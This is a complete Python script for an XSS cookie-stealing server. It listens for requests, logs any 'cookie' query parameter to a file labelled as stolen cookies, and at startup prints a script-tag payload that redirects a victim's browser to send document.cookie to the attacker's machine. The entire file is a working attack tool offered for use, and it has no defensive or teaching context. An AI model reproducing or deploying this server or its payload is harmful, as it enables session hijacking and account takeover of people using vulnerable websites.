import http.server
import socketserver
import urllib.parse
import socket

class CookieStealingServer(http.server.SimpleHTTPRequestHandler):
    def log_message(self, format, *args):
        # Suppressing standard server logs
        pass

    def do_GET(self):
        # Extract query parameters from the URL
        parsed_url = urllib.parse.urlparse(self.path)
        query_params = urllib.parse.parse_qs(parsed_url.query)
        cookie_value = query_params.get('cookie', [''])[0]

        # Check and log the cookie if present
        if cookie_value:
            with open("stolen_cookies.log", "a") as log:
                log.write(f"[+] Stolen cookie: {cookie_value}\n")
                print(f"[+] Stolen cookie: {cookie_value}")  # Also print to console for immediate feedback

        # Always respond with a success page
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        response_content = '<html><body><h1>Cookie stealing successful!</h1></body></html>'
        self.wfile.write(response_content.encode('utf-8'))

def get_local_ip():
    # Attempt to find the best possible IP for the server
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        # Connect to a dummy address to initialize the socket's own address
        s.connect(('10.255.255.255', 1))
        IP = s.getsockname()[0]
    except Exception:
        IP = '127.0.0.1'
    finally:
        s.close()
    return IP

def start_server(port):
    local_ip = get_local_ip()
    server_address = ('', port)
    httpd = socketserver.TCPServer(server_address, CookieStealingServer)
    print(f"[*] Cookie stealing server started on port {port}")
    print(f"[*] Use the following payload in an XSS vulnerability: <script>document.location='http://{local_ip}:{port}/?cookie='+document.cookie</script>")
    httpd.serve_forever()

if __name__ == "__main__":
    server_port = 8008
    start_server(server_port)
